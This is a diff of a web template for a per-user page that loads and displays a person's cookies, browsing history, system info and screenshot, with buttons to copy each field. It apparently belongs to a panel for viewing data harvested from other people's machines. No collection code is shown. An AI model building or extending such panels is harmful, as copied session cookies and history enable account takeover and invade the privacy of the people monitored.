@@ -1,145 +1,51 @@
 <!doctype html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<title>User {{ user.username }} Details</title>
-<style>
-  /* --- Тёмная тема + исходный градиент --- */
-  body {
-    margin: 0;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    background: linear-gradient(135deg, #1f1c2c, #928dab);
-    color: #f0f0f0;
-  }
-  header {
-    padding: 1rem 2rem;
-    background: linear-gradient(90deg, #4b6cb7, #182848);
-    text-align: center;
-    font-size: 1.5rem;
-    font-weight: bold;
-    color: #fff;
-  }
-  .container {
-    max-width: 900px;
-    margin: 2rem auto;
-    padding: 1rem;
-  }
-  .user-card {
-    background: rgba(30,30,30,0.8);
-    border-radius: 12px;
-    padding: 1.5rem;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-  }
-
-  /* --- Анимация вылета --- */
-  @keyframes flyUp {
-    0% {opacity:0; transform: translateY(30px);}
-    100% {opacity:1; transform: translateY(0);}
-  }
-  .fly-section {
-    opacity: 0;
-    animation: flyUp 0.5s ease-out forwards;
-  }
-
-  /* --- JSON блоки --- */
-  .json-box {
-    background: rgba(50,50,50,0.8);
-    padding: 0.5rem;
-    border-radius: 8px;
-    font-family: monospace;
-    overflow-x: auto;
-    max-height: 300px;
-  }
-
-  /* --- Кнопки --- */
-  .action-btn {
-    margin-top: 0.5rem;
-    margin-bottom: 1rem;
-    background: linear-gradient(90deg,#667eea,#764ba2);
-    border: none;
-    border-radius: 8px;
-    padding: 0.5rem 1rem;
-    color: #fff;
-    cursor: pointer;
-    transition: all 0.3s ease;
-  }
-  .action-btn:hover {
-    background: linear-gradient(90deg,#764ba2,#667eea);
-    transform: scale(1.05);
-  }
-
-  /* --- Скриншот --- */
-  .screenshot {
-    max-width: 100%;
-    border-radius: 12px;
-    margin-top: 1rem;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-  }
-</style>
+  <meta charset="utf-8">
+  <title>User {{ user.username }} Details</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
 </head>
 <body>
 <header>User {{ user.username }} Details</header>
-
 <div class="container">
   <div class="user-card">
-    <div class="fly-section">
-      <p><strong>ID:</strong> {{ user.id }}</p>
-      <p><strong>Username:</strong> {{ user.username }}</p>
-      <p><strong>Timestamp:</strong> <span id="timestamp">Loading…</span></p>
-    </div>
+    <p><strong>ID:</strong> {{ user.id }}</p>
+    <p><strong>Username:</strong> {{ user.username }}</p>
+    <p><strong>Timestamp:</strong> {{ user.timestamp }}</p>
 
-    <div class="fly-section">
-      <h3>Cookies</h3>
-      <pre id="cookies" class="json-box">Loading…</pre>
-      <button class="action-btn" onclick="copyField('cookies')">Copy Cookies</button>
-    </div>
+    <h3>Cookies</h3>
+    <pre id="cookies" class="json-box">Loading…</pre>
+    <button class="action-btn" onclick="copyField('cookies')">Copy Cookies</button>
 
-    <div class="fly-section">
-      <h3>History</h3>
-      <pre id="history" class="json-box">Loading…</pre>
-      <button class="action-btn" onclick="copyField('history')">Copy History</button>
-    </div>
+    <h3>History</h3>
+    <pre id="history" class="json-box">Loading…</pre>
+    <button class="action-btn" onclick="copyField('history')">Copy History</button>
 
-    <div class="fly-section">
-      <h3>System Info</h3>
-      <pre id="system" class="json-box">Loading…</pre>
-      <button class="action-btn" onclick="copyField('system')">Copy System Info</button>
-    </div>
+    <h3>System Info</h3>
+    <pre id="system" class="json-box">Loading…</pre>
+    <button class="action-btn" onclick="copyField('system')">Copy System Info</button>
 
-    <div id="screenshot-wrap" class="fly-section"></div>
+    <div id="screenshot-wrap"></div>
   </div>
 </div>
 
 <script>
 const userId = {{ user.id }};
-
+function showJSON(elemId, obj){
+  document.getElementById(elemId).textContent = JSON.stringify(obj, null, 2);
+}
 function copyField(id){
-  const text = document.getElementById(id).textContent;
-  navigator.clipboard.writeText(text).then(()=> alert("Copied"));
+  navigator.clipboard.writeText(document.getElementById(id).textContent).then(()=> alert("Copied"));
 }
-
-function animateSections(){
-  const sections = document.querySelectorAll('.fly-section');
-  sections.forEach((sec, i) => {
-    sec.style.animationDelay = `${i * 0.1}s`;
-    sec.classList.add('fly-section'); 
-  });
-}
-
 async function loadData(){
-  const resp = await fetch(`/api/data/${userId}`, { credentials: 'same-origin' });
-  if(!resp.ok){
-    document.getElementById('cookies').textContent = 'Error loading';
-    document.getElementById('history').textContent = await resp.text();
-    return;
-  }
-  const j = await resp.json();
-  document.getElementById('cookies').textContent = JSON.stringify(j.cookies, null, 2);
-  document.getElementById('history').textContent = JSON.stringify(j.history, null, 2);
-  document.getElementById('system').textContent = JSON.stringify(j.system_info, null, 2);
-  document.getElementById('timestamp').textContent = j.timestamp;
+  try {
+    const resp = await fetch(`/api/data/${userId}`, { credentials: 'same-origin' });
+    const j = await resp.json();
+    showJSON('cookies', j.cookies);
+    showJSON('history', j.history);
+    showJSON('system', j.system_info);
+  } catch(e){ console.error(e); }
 
-  // загрузка скриншота
   const imgWrap = document.getElementById('screenshot-wrap');
   try {
     const imgResp = await fetch(`/screenshot/${userId}`, { credentials: 'same-origin' });
@@ -148,11 +54,8 @@ async function loadData(){
       const url = URL.createObjectURL(blob);
       imgWrap.innerHTML = `<h3>Screenshot</h3><img src="${url}" class="screenshot" alt="screenshot">`;
     }
-  } catch(e){}
-
-  animateSections();
+  } catch(e){ console.log('No screenshot'); }
 }
-
 loadData();
 </script>
 </body>
